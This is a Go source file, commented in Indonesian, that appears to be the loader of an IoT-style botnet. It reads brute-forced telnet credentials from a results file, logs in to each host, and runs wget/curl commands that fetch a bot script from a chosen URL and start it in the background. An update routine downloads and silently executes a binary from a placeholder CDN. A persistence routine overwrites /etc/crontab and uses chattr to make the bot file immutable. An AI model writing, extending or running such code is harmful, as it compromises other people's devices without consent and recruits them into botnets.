package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
	"time"
)

// Tambahkan di loader.go
func updateBot(ip string) {
	// Implementasi sistem update Over-The-Air
	newVersionURL := "http://yourcdn.com/latest.bin"
	cmd := fmt.Sprintf("wget %s -O /tmp/update && chmod +x /tmp/update && /tmp/update -silent", newVersionURL)
	sendBinaryCommand(ip, cmd)
}

// Tambahkan di loader.go
func establishPersistence(ip, user, pass string) {
	persistenceCmds := []string{
		"echo '* * * * * /tmp/bot.py' > /etc/crontab",
		"systemctl enable /tmp/bot.py",
		"chattr +i /tmp/bot.py", // Membuat file immutable
	}
	// Eksekusi commands
	// (Belum ada implementasi detail eksekusi, disesuaikan dengan koneksi ke target)
}

func injectBot(ip, user, passwd, botScriptURL string) bool {
	fmt.Printf("[LOADER] Menyambung ke %s sebagai %s/%s\n", ip, user, passwd)
	conn, err := net.DialTimeout("tcp", ip+":23", 5*time.Second)
	if err != nil {
		fmt.Printf("[X] Gagal koneksi ke %s: %v\n", ip, err)
		return false
	}
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(5 * time.Second))
	buf := make([]byte, 4096)

	// Tunggu "login:"
	conn.Read(buf)
	conn.Write([]byte(user + "\n"))
	time.Sleep(1 * time.Second)

	// Tunggu "Password:"
	conn.Read(buf)
	conn.Write([]byte(passwd + "\n"))
	time.Sleep(2 * time.Second)

	// Cek prompt
	n, _ := conn.Read(buf)
	output := string(buf[:n])
	if !strings.Contains(output, "#") && !strings.Contains(output, ">") && !strings.Contains(output, "$") {
		fmt.Printf("[!] Gagal shell akses ke %s\n", ip)
		return false
	}

	commands := []string{
		fmt.Sprintf("wget %s -O /tmp/bot.py || curl -o /tmp/bot.py %s", botScriptURL, botScriptURL),
		"chmod +x /tmp/bot.py",
		"nohup python3 /tmp/bot.py &",
	}

	for _, cmd := range commands {
		conn.Write([]byte(cmd + "\n"))
		time.Sleep(1 * time.Second)
	}

	conn.Write([]byte("exit\n"))
	fmt.Printf("[✓] Bot berhasil dikirim ke %s\n", ip)
	return true
}

func RunLoader() {
	if _, err := os.Stat("brute_results.txt"); os.IsNotExist(err) {
		fmt.Println("[!] File brute_results.txt tidak ditemukan.")
		return
	}

	file, err := os.Open("brute_results.txt")
	if err != nil {
		fmt.Println("[X] Gagal membuka brute_results.txt")
		return
	}
	defer file.Close()

	var bruteResults [][3]string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		parts := strings.Split(line, "|")
		if len(parts) == 3 {
			bruteResults = append(bruteResults, [3]string{parts[0], parts[1], parts[2]})
		}
	}

	if len(bruteResults) == 0 {
		fmt.Println("[!] Tidak ada data valid di brute_results.txt")
		return
	}

	fmt.Print("[URL] Masukkan link bot script (misal: http://yourhost/bot.py): ")
	input := bufio.NewScanner(os.Stdin)
	input.Scan()
	botScriptURL := strings.TrimSpace(input.Text())

	for _, creds := range bruteResults {
		injectBot(creds[0], creds[1], creds[2], botScriptURL)
	}

	fmt.Println("[✓] Semua bot berhasil dikirim.")
}
